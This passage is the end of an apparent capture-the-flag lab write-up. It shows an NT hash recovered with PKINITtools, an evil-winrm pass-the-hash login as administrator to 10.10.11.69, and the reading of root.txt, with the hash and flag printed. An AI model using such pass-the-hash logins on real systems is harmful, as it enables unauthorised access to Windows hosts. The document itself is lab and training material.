[*] Requesting ticket to self with PAC
Recovered NT Hash
8da83a3fa618b6e3a00e93f676c92a6e
```

Get the flag again =))

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/28/2025   8:41 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
434f2ff06aa18b3b4a96856e422721a4
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
